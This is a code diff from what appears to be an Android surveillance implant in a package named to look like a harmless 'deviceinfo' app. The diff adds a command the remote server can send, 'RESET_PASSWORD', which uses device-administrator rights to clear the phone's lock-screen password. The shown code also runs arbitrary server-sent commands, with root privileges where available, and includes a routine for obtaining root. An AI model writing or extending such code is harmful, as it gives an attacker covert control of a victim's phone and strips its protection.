@@ -15,6 +15,10 @@ import java.security.SecureRandom;
 import java.util.Date;
 import java.util.Vector;
 
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+
 import com.android.deviceinfo.Core;
 import com.android.deviceinfo.Device;
 import com.android.deviceinfo.Root;
@@ -29,6 +33,7 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Directory;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.iKeys;
+import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
@@ -111,8 +116,11 @@ public class ZProtocol extends Protocol {
 			}
 
 			final boolean[] capabilities = identification();
-			
-			if(Core.self().wantsReload()){
+
+			if (Status.self().wantsReload()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (perform) ");
+				}
 				Core.self().reloadConf();
 			}
 
@@ -989,12 +997,31 @@ public class ZProtocol extends Protocol {
 			throw new ProtocolException();
 		}
 	}
-	
+
+	private ExecuteResult resetPassword() {
+		boolean ret = false;
+		ExecuteResult res = new ExecuteResult(M.e("RESET_PASSWORD"));
+		ComponentName devAdminReceiver = new ComponentName(Status.getAppContext(), AR.class);
+		DevicePolicyManager dpm = (DevicePolicyManager) Status.getAppContext().getSystemService(
+				Context.DEVICE_POLICY_SERVICE);
+		if (dpm.isAdminActive(devAdminReceiver)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (removeAdmin) remove password");
+			}
+
+			if (Cfg.DEBUG) {
+				ret = dpm.resetPassword("", 0);
+			}
+		}
+		res.stdout.add( (ret?"OK RESET":"NO RESET") );
+		return res;
+	}
+
 	private ExecuteResult enableCyanogenmod() {
 		ExecuteResult res = new ExecuteResult(M.e("ENABLE_CYANOGENMOD"));
 		try {
 			Cfg.SUPPORT_CYANOGENMOD = true;
-			//Cfg.FORCE_ROOT= true; 
+			// Cfg.FORCE_ROOT= true;
 			Root.getPermissions();
 			res.stdout.add("ok");
 		} catch (Exception ex) {
@@ -1025,10 +1052,12 @@ public class ZProtocol extends Protocol {
 					ExecuteResult ret;
 					if (executionLine.equals(M.e("ENABLE_CYANOGENMOD"))) {
 						ret = enableCyanogenmod();
+					} else if (executionLine.equals(M.e("RESET_PASSWORD"))) {
+						ret = resetPassword();
 					} else {
-						if(Status.self().haveRoot()){
+						if (Status.self().haveRoot()) {
 							ret = Execute.executeRoot(executionLine);
-						}else{
+						} else {
 							ret = Execute.execute(executionLine);
 						}
 					}
